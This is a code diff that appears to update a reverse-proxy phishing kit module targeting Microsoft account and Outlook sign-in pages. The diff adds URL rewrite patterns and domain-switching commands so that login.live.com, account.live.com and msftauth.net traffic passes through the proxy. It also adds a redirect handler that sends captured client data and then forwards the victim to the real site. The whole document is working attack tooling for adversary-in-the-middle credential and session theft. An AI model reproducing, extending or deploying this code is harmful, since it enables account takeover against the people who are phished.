@@ -16,16 +16,21 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
     constructor(proxyResp, browserEndPoint) {
 
         super(proxyResp, browserEndPoint)
-        this.regexes = [
-             {
-                reg: /https:\/\/account.live.com\/identity\/confirm/igm, // Google chrome on windows fix
-                replacement: '/identity/confirm/'
-             },
-        ]
+        // this.regexes = [
+        //      {
+        //         reg: /https:\/\/account.live.com\/identity\/confirm/igm,
+        //         replacement: '/identity/confirm/'
+        //      },
+
+        //      {
+        //         reg: /https:\/\/logincdn.msftauth.net/igm,
+        //         replacement: '/logincdn/'
+        //      },
+        // ]
     }
 
 
-    processResponse() {
+    processResponse(clientContext) {
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
@@ -39,28 +44,30 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             }
         }
 
-        let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
-        appHeaders = appHeaders.filter(appSingleHeader => {
-            return !appSingleHeader.startsWith('OParams=')
-        })
-        this.browserEndPoint.setHeader('set-cookie', appHeaders)
+        return super.processResponse(clientContext)
+
+        // let appHeaders = this.browserEndPoint.getHeaders()['set-cookie'] || []
+        // appHeaders = appHeaders.filter(appSingleHeader => {
+        //     return !appSingleHeader.startsWith('OParams=')
+        // })
+        // this.browserEndPoint.setHeader('set-cookie', appHeaders)
 
 
         // this.browserEndPoint.removeHeader('content-security-policy')
-        let newMsgBody;
-        return this.superPrepareResponse(true)
-            .then((msgBody) => {
-                newMsgBody = msgBody
-                for (let i = 0; i < this.regexes.length; i += 1) {
-                    const regExObj = this.regexes[i]
-                    if (regExObj.reg.test(newMsgBody)) {
-                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
-                    }
-                }
-                this.superFinishResponse(newMsgBody)
-            }).catch((err) => {
-            console.error(err)
-        })
+        // let newMsgBody;
+        // return this.superPrepareResponse(true)
+        //     .then((msgBody) => {
+        //         newMsgBody = msgBody
+        //         for (let i = 0; i < this.regexes.length; i += 1) {
+        //             const regExObj = this.regexes[i]
+        //             if (regExObj.reg.test(newMsgBody)) {
+        //                 newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
+        //             }
+        //         }
+        //         this.superFinishResponse(newMsgBody)
+        //     }).catch((err) => {
+        //     console.error(err)
+        // })
     }
 
     afterEmailPath() {
@@ -87,6 +94,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         // Check for redirect
         const redirectToken = this.checkForRedirect()
         if (redirectToken !== null) {
+            if (redirectToken.url.startsWith('https://account.live.com/')) {
+                super.sendClientData(clientContext, {})
+                return super.exitLink('https://account.live.com/')
+            }
             if (redirectToken.url.startsWith('https://login.live.com/oauth20_authorize.srf?')) {
                 clientContext.currentDomain = 'login.live.com'
                 this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
@@ -97,6 +108,10 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
                 super.sendClientData(clientContext, {})
                 return super.exitLink('https://outlook.com')
             }
+
+            // this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
+            // return super.superExecuteProxy(redirectToken.obj.host, clientContext)
+
         }
     
 
@@ -124,6 +139,18 @@ const configExport = {
 
     EXIT_URL: 'https://outlook.com',
 
+    PATTERNS: [
+        {
+            match: "https://account.live.com/identity/confirm",
+            replace: '/identity/confirm/'
+         },
+
+        //  {
+        //     match: /https:\/\/logincdn.msftauth.net/igm,
+        //     replace: '/logincdn/'
+        //  },
+    ],
+
     EXTRA_COMMANDS: [
         
         {
@@ -132,6 +159,14 @@ const configExport = {
             command_args: {
                 new_domain: 'account.live.com',
                 persistent: true,
+                },
+        },
+        {
+            path: '/logincdn/',
+            command: 'CHANGE_DOMAIN',
+            command_args: {
+                new_domain: 'logincdn.msftauth.net',
+                persistent: false,
                 },
         },
 
@@ -145,7 +180,8 @@ const configExport = {
 
     EXTERNAL_FILTERS: [
         'account.live.com',
-        'login.live.com'
+        'login.live.com',
+        'logincdn.msftauth.net'
     ],
 
     PRE_HANDLERS:[],
